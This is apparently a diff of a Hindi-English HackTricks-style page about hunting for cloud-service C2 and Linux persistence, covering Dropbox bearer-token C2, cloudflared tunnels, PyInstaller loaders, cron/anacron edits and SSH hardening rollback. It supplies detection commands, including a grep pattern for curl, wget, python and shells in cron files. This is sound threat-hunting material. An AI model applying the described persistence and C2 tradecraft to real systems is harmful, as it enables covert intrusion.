-- सर्वर कार्यभार से Dropbox डोमेन के लिए आउटबाउंड HTTPS के लिए प्रॉक्सी/नेटफ्लो/ज़ीक/सुरिकाटा में शिकार करें जो सामान्यतः फ़ाइलें समन्वयित नहीं करते हैं।
-- टनलिंग के माध्यम से समानांतर/बैकअप C2 (जैसे, Cloudflare Tunnel `cloudflared`), यदि एक चैनल अवरुद्ध हो जाए तो नियंत्रण बनाए रखना।
-- होस्ट IOCs: `cloudflared` प्रक्रियाएँ/इकाइयाँ, `~/.cloudflared/*.json` पर कॉन्फ़िगरेशन, Cloudflare किनारों के लिए आउटबाउंड 443।
+### bearer tokens और anti-analysis stagers के साथ Cloud-service C2
+Observed tradecraft ने कई long-haul C2 paths और anti-analysis packaging को संयोजित किया:<sup>[[3]](#references)</sup>
+- sandboxing और static analysis में बाधा डालने वाले password-protected PyInstaller ELF loaders (जैसे encrypted PYZ, `/_MEI*` के अंतर्गत temporary extraction)।
+- Indicators: `strings` में `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` जैसे hits।
+- Runtime artifacts: `/tmp/_MEI*` या custom `--runtime-tmpdir` paths में extraction।
+- hardcoded OAuth Bearer tokens का उपयोग करने वाला Dropbox-backed C2
+- Network markers: `Authorization: Bearer <token>` के साथ `api.dropboxapi.com` / `content.dropboxapi.com`।
+- ऐसे server workloads से Dropbox domains पर outbound HTTPS के लिए proxy/NetFlow/Zeek/Suricata में hunt करें, जो सामान्यतः files sync नहीं करते।
+- tunneling (जैसे Cloudflare Tunnel `cloudflared`) के माध्यम से parallel/backup C2, ताकि एक channel block होने पर भी control बना रहे।
+- Host IOCs: `cloudflared` processes/units, `~/.cloudflared/*.json` पर config, और Cloudflare edges के लिए outbound 443।
 
-### Persistence and “hardening rollback” to maintain access (Linux examples)
-हमलावर अक्सर आत्म-पैचिंग को टिकाऊ पहुंच पथों के साथ जोड़ते हैं:
-- क्रोन/एनाक्रोन: प्रत्येक `/etc/cron.*/` निर्देशिका में `0anacron` स्टब में संपादन के लिए आवधिक निष्पादन।
-- शिकार:
+### Access बनाए रखने के लिए Persistence और “hardening rollback” (Linux examples)
+Attackers अक्सर self-patching को durable access paths के साथ जोड़ते हैं:<sup>[[3]](#references)</sup>
+- Cron/Anacron: periodic execution के लिए प्रत्येक `/etc/cron.*/` directory में `0anacron` stub में edits।
+- Hunt:
 ```bash
 for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
 grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
 ```
-- SSH कॉन्फ़िगरेशन हार्डनिंग रोलबैक: रूट लॉगिन सक्षम करना और निम्न-विशिष्ट खातों के लिए डिफ़ॉल्ट शेल को बदलना।
-- रूट लॉगिन सक्षम करने के लिए शिकार:
+- SSH configuration hardening rollback: root logins enable करना और low-privileged accounts के लिए default shells बदलना।
+- Root login enablement के लिए hunt करें:
 ```bash
 grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
-# "yes" या अत्यधिक अनुमति सेटिंग्स जैसे ध्वज मान
+# "yes" जैसे values या अत्यधिक permissive settings को flag करें
 ```
-- सिस्टम खातों पर संदिग्ध इंटरैक्टिव शेल के लिए शिकार (जैसे, `games`):
+- System accounts (जैसे `games`) पर suspicious interactive shells के लिए hunt करें:
 ```bash
 awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
 ```
-- डिस्क पर गिराए गए यादृच्छिक, छोटे नाम वाले बीकन कलाकृतियाँ (8 वर्णमाला वर्ण) जो क्लाउड C2 से भी संपर्क करती हैं:
-- शिकार:
+- Disk पर छोड़े गए random, short-named beacon artifacts (8 alphabetical chars), जो cloud C2 से भी contact करते हैं:
+- Hunt:
 ```bash
 find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
 -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
 ```
 
-रक्षा करने वालों को इन कलाकृतियों को बाहरी एक्सपोजर और सेवा पैचिंग घटनाओं के साथ सहसंबंधित करना चाहिए ताकि प्रारंभिक शोषण को छिपाने के लिए उपयोग की जाने वाली एंटी-फॉरेंसिक आत्म-उपचार को उजागर किया जा सके।
+Defenders को initial exploitation को छिपाने के लिए उपयोग किए गए anti-forensic self-remediation का पता लगाने हेतु इन artifacts का external exposure और service patching events के साथ correlation करना चाहिए।
 
 ## References
 
-- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)
-https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
-- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)
-https://redcanary.com/blog/etw-patching-detection
-
-- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
-- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
+- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
+- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
+- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
